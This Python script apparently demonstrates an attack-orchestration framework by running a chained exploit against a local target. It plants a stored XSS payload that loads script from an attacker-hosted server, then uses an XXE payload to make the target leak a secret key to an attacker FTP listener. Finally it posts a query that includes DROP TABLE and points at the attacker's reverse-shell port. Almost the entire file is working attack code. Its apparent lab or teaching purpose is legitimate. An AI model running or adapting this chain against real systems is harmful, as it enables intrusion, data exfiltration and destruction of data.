#!/usr/bin/env python3

import os

import requests

from horrors import (
    scenarios,
    services,
    events,
)


async def plant_xss(scenario):
    """Post XSS payload

    """
    await scenario.http_post(
        'http://{rhost}:{rport}/test/'.format(**scenario.context),
        'field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**scenario.context),
        scenario.context['post_headers'],
    )


async def get_new_account(scenario):
    """Wait for `xss` event triggered when request path contains `xss.js`

    """
    result = await scenario.http_get(
        'http://{rhost}:{rport}/userid/{username}'.format(**scenario.context)
    )
    scenario.context['userid'] = result
    return 'userid'


async def send_xxe(scenario):
    """Post XXE payload using value `userid` stored in local context

    """
    await scenario.http_post(
        'http://{rhost}:{rport}/xml-import/'.format(**scenario.context),
        '<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**scenario.context),
        scenario.context['post_headers'],
    )


async def reverse_shell(scenario):
    """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret

    """
    await scenario.http_post(
        'http://{rhost}:{rport}/query/'.format(**scenario.context),
        'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
        scenario.context['post_headers'],
    )


if __name__ == "__main__":
    context = {
        'rhost': '127.0.0.1',
        'rport': 8008,
        'lhost': '127.0.0.1',
        'lport_http': 8888,
        'lport_reverse': 4444,
        'lport_ftp': 2121,
        'username': 'evil',
        'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
    }

    story = scenarios.Scenario(**context)
    # story.set_proxy('http://127.0.0.1:8080')  # In case you'd like to watch it live

    httpd = services.HTTPStatic(story)
    httpd.add_route('/', 'This is home page...')
    httpd.add_route('/xss.js', open(os.path.join(os.path.dirname(__file__), 'xss.js')).read().format(**context))
    httpd.add_route('/timestamp', services.HTTPStatic.timestamp)
    httpd.add_event('xss', when=events.PathContains('xss.js'))

    ftpd = services.FTPReader(story)
    ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', in_context='secret'))

    story.add_scene(plant_xss)
    story.add_scene(get_new_account, when='xss')
    story.add_scene(send_xxe, when='userid')
    story.add_scene(reverse_shell, when='xxe')
    story.set_debug()
    story.play()
